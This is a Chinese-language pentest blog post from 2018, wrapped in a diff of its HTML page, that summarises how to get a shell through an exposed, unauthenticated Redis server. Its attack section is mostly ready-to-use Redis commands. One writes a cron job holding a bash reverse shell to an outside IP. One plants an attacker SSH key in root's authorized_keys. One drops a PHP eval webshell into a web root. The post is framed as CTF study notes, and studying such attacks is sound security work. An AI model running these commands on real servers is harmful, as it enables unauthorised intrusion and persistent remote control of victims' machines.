@@ -1,0 +1,368 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="之前做杭电的hgame的时候有一道ssrf打sql的题,当时找资料的时候倒是很多ssrf打redis的东西,这次学习一下吧,顺便总结一下 概述首先redis是个非关系型数据库,然后redis更偏向于memcache一点,它是一个key-value型的数据库,信息以键值形式存在内存中。当然你也可以用save把它存至硬盘,这个时候就可能会getshell了 几种简单的方法  1.通过向web目录写we">
+<meta property="og:type" content="article">
+<meta property="og:title" content="redis在渗透测试中的利用总结">
+<meta property="og:url" content="http://example.com/2018/07/03/redis%E5%9C%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%ADgetshell%E6%80%BB%E7%BB%93/index.html">
+<meta property="og:site_name" content="blacsheep&#39;s blog">
+<meta property="og:description" content="之前做杭电的hgame的时候有一道ssrf打sql的题,当时找资料的时候倒是很多ssrf打redis的东西,这次学习一下吧,顺便总结一下 概述首先redis是个非关系型数据库,然后redis更偏向于memcache一点,它是一个key-value型的数据库,信息以键值形式存在内存中。当然你也可以用save把它存至硬盘,这个时候就可能会getshell了 几种简单的方法  1.通过向web目录写we">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2018-07-03T10:21:21.000Z">
+<meta property="article:modified_time" content="2023-07-10T02:12:02.243Z">
+<meta property="article:author" content="blacsheep">
+<meta name="twitter:card" content="summary">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>redis在渗透测试中的利用总结</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+		<script type="text/x-mathjax-config">
+		  MathJax.Hub.Config({
+			tex2jax: {
+			  skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
+			  inlineMath: [['$','$']]
+			}
+		  });
+		</script>
+		<script src='https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/latest.js?config=TeX-MML-AM_CHTML' async></script>
+	
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/categories/">Category</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2018/07/03/%E8%AE%A1%E7%BD%91%E5%A4%8D%E4%B9%A0%E7%BD%91%E7%BB%9C%E5%B1%82/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2018/07/02/vulhub%E5%A4%8D%E7%8E%B0%E5%A4%A7%E6%A6%82%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2018/07/03/redis%E5%9C%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%ADgetshell%E6%80%BB%E7%BB%93/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2018/07/03/redis%E5%9C%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%ADgetshell%E6%80%BB%E7%BB%93/&text=redis在渗透测试中的利用总结"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2018/07/03/redis%E5%9C%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%ADgetshell%E6%80%BB%E7%BB%93/&title=redis在渗透测试中的利用总结"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2018/07/03/redis%E5%9C%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%ADgetshell%E6%80%BB%E7%BB%93/&is_video=false&description=redis在渗透测试中的利用总结"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=redis在渗透测试中的利用总结&body=Check out this article: http://example.com/2018/07/03/redis%E5%9C%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%ADgetshell%E6%80%BB%E7%BB%93/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2018/07/03/redis%E5%9C%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%ADgetshell%E6%80%BB%E7%BB%93/&title=redis在渗透测试中的利用总结"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2018/07/03/redis%E5%9C%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%ADgetshell%E6%80%BB%E7%BB%93/&title=redis在渗透测试中的利用总结"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2018/07/03/redis%E5%9C%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%ADgetshell%E6%80%BB%E7%BB%93/&title=redis在渗透测试中的利用总结"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2018/07/03/redis%E5%9C%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%ADgetshell%E6%80%BB%E7%BB%93/&title=redis在渗透测试中的利用总结"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2018/07/03/redis%E5%9C%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%ADgetshell%E6%80%BB%E7%BB%93/&name=redis在渗透测试中的利用总结&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2018/07/03/redis%E5%9C%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%ADgetshell%E6%80%BB%E7%BB%93/&t=redis在渗透测试中的利用总结"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A6%82%E8%BF%B0"><span class="toc-number">1.</span> <span class="toc-text">概述</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#redis%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%90%AD%E5%BB%BA"><span class="toc-number">2.</span> <span class="toc-text">redis服务器搭建</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%94%BB%E5%87%BB"><span class="toc-number">3.</span> <span class="toc-text">攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#crontabs%E6%94%BB%E5%87%BB"><span class="toc-number">3.1.</span> <span class="toc-text">crontabs攻击</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%99sshkey%E6%9D%A5getshell"><span class="toc-number">3.2.</span> <span class="toc-text">写sshkey来getshell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%99webshell"><span class="toc-number">3.3.</span> <span class="toc-text">写webshell</span></a></li></ol></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        redis在渗透测试中的利用总结
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">blacsheep</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2018-07-03T10:21:21.000Z" class="dt-published" itemprop="datePublished">2018-07-03</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/pentest/">pentest</a>
+    </div>
+
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <p>之前做杭电的hgame的时候有一道ssrf打sql的题,当时找资料的时候倒是很多ssrf打redis的东西,这次学习一下吧,顺便总结一下</p>
+<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>首先redis是个非关系型数据库,然后redis更偏向于memcache一点,它是一个key-value型的数据库,信息以键值形式存在内存中。当然你也可以用save把它存至硬盘,这个时候就可能会getshell了 几种简单的方法</p>
+<blockquote>
+<p>1.通过向web目录写webshell来getshell 2.写ssh-key来getshell 3.写crontab来getshell</p>
+</blockquote>
+<p>当然,这些攻击都包含一些要求,比如当前用户的权限,目录权限,web目录是否已知等,怎么利用还是看具体场合</p>
+<h2 id="redis服务器搭建"><a href="#redis服务器搭建" class="headerlink" title="redis服务器搭建"></a>redis服务器搭建</h2><p><strong>第1步：redis服务的下载</strong></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http://download.redis.io/releases/redis-4.0.9.tar.gz</span><br></pre></td></tr></table></figure>
+
+<p><strong>第2步：redis解压、编译</strong></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">tar -zxvf redis-4.0.9.tar.gz</span><br><span class="line">cd redis-4.0.9</span><br><span class="line">make</span><br><span class="line">make test</span><br><span class="line">make install</span><br></pre></td></tr></table></figure>
+
+<p><strong>第3步：启动redis服务</strong> 新版本的redis默认监听本地,我们可以改成0.0.0.0</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim redis.conf</span><br></pre></td></tr></table></figure>
+
+<p>然后启动服务</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">redis-server /root/redis-4.0.9/redis.conf</span><br></pre></td></tr></table></figure>
+
+<h2 id="攻击"><a href="#攻击" class="headerlink" title="攻击"></a>攻击</h2><p>首先都是用redis客户端连接</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">redis-cli.exe -h 192.168.182.128 -p 6379</span><br></pre></td></tr></table></figure>
+
+<h3 id="crontabs攻击"><a href="#crontabs攻击" class="headerlink" title="crontabs攻击"></a><strong>crontabs攻击</strong></h3><p><strong>1.设置文件夹路径</strong></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">config set dir /var/spool/cron/crontabs</span><br></pre></td></tr></table></figure>
+
+<p><strong>2.修改备份的文件的名称</strong></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">config set dbfilename root</span><br></pre></td></tr></table></figure>
+
+<p><strong>3.设置计划任务</strong></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set -.- &quot;\n\n\n* * * * * bash -i &gt;&amp; /dev/tcp/198.xx.xx.xxx/9999 0&gt;&amp;1\n\n\n&quot;</span><br></pre></td></tr></table></figure>
+
+<p><strong>4.保存</strong></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">save</span><br></pre></td></tr></table></figure>
+
+<p>然后上服务器监听就ok了 不过这种方式我并没有getshell过,原因位置,后续再慢慢看吧…</p>
+<h3 id="写sshkey来getshell"><a href="#写sshkey来getshell" class="headerlink" title="写sshkey来getshell"></a><strong>写sshkey来getshell</strong></h3><p><strong>1.生产密钥</strong></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen</span><br></pre></td></tr></table></figure>
+
+<p>选rsa,认证自己定,然后</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(echo -e &quot;\n\n\n\n&quot;; cat id_rsa.pub; echo -e &quot;\n\n\n\n&quot;) &gt; pub.txt</span><br></pre></td></tr></table></figure>
+
+<p><strong>2.将密钥写到服务器</strong></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">config set dir /root/.ssh/</span><br><span class="line">config set dbfilename &quot;authorized_keys&quot;</span><br><span class="line">config set 233 &quot;xxxx&quot;</span><br><span class="line">save</span><br></pre></td></tr></table></figure>
+
+<p>这里的xxx就是pub.txt里面的东西,其实可以直接copy 一下id_rsa.pub里面的东西,然后前后加回车即可。 <strong>3.连接就ok了</strong></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -i id_rsa root@xxx.xxx.xxx.xxx</span><br></pre></td></tr></table></figure>
+
+<h3 id="写webshell"><a href="#写webshell" class="headerlink" title="写webshell"></a><strong>写webshell</strong></h3><p>一样的原理 不过限制就是:要求web目录已知,而且当前用户在目录有写权限</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">config set dir /var/www/test.com/html/</span><br><span class="line">config set dbfilename shell.php</span><br><span class="line">set 1 &quot;&lt;?php @eval($_POST[&#x27;fuck&#x27;]);?&gt;&quot;</span><br><span class="line">save</span><br></pre></td></tr></table></figure>
+
+<p>这里先把redis下的攻击方式写一下,后续应该还会分析一下phithon的那篇ssrf和python的博客。 参考链接: <a target="_blank" rel="noopener" href="http://foreversong.cn/archives/1180" title="http://foreversong.cn/archives/1180">http://foreversong.cn/archives/1180</a> Adog-redis在渗透测试中的利用 <a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/write-webshell-via-redis-server.html" title="https://www.leavesongs.com/PENETRATION/write-webshell-via-redis-server.html">https://www.leavesongs.com/PENETRATION/write-webshell-via-redis-server.html</a> phithon-利用redis写webshell <a target="_blank" rel="noopener" href="https://lorexxar.cn/2016/12/03/redis-getshell/" title="https://lorexxar.cn/2016/12/03/redis-getshell/">https://lorexxar.cn/2016/12/03/redis-getshell/</a> Lorexxar-通过redis getshell的一些小问题</p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a href="/categories/">Category</a></li>
+        
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A6%82%E8%BF%B0"><span class="toc-number">1.</span> <span class="toc-text">概述</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#redis%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%90%AD%E5%BB%BA"><span class="toc-number">2.</span> <span class="toc-text">redis服务器搭建</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%94%BB%E5%87%BB"><span class="toc-number">3.</span> <span class="toc-text">攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#crontabs%E6%94%BB%E5%87%BB"><span class="toc-number">3.1.</span> <span class="toc-text">crontabs攻击</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%99sshkey%E6%9D%A5getshell"><span class="toc-number">3.2.</span> <span class="toc-text">写sshkey来getshell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%99webshell"><span class="toc-number">3.3.</span> <span class="toc-text">写webshell</span></a></li></ol></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2018/07/03/redis%E5%9C%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%ADgetshell%E6%80%BB%E7%BB%93/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2018/07/03/redis%E5%9C%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%ADgetshell%E6%80%BB%E7%BB%93/&text=redis在渗透测试中的利用总结"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2018/07/03/redis%E5%9C%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%ADgetshell%E6%80%BB%E7%BB%93/&title=redis在渗透测试中的利用总结"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2018/07/03/redis%E5%9C%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%ADgetshell%E6%80%BB%E7%BB%93/&is_video=false&description=redis在渗透测试中的利用总结"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=redis在渗透测试中的利用总结&body=Check out this article: http://example.com/2018/07/03/redis%E5%9C%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%ADgetshell%E6%80%BB%E7%BB%93/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2018/07/03/redis%E5%9C%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%ADgetshell%E6%80%BB%E7%BB%93/&title=redis在渗透测试中的利用总结"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2018/07/03/redis%E5%9C%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%ADgetshell%E6%80%BB%E7%BB%93/&title=redis在渗透测试中的利用总结"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2018/07/03/redis%E5%9C%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%ADgetshell%E6%80%BB%E7%BB%93/&title=redis在渗透测试中的利用总结"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2018/07/03/redis%E5%9C%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%ADgetshell%E6%80%BB%E7%BB%93/&title=redis在渗透测试中的利用总结"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2018/07/03/redis%E5%9C%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%ADgetshell%E6%80%BB%E7%BB%93/&name=redis在渗透测试中的利用总结&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2018/07/03/redis%E5%9C%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%ADgetshell%E6%80%BB%E7%BB%93/&t=redis在渗透测试中的利用总结"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2023
+    blacsheep
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/categories/">Category</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
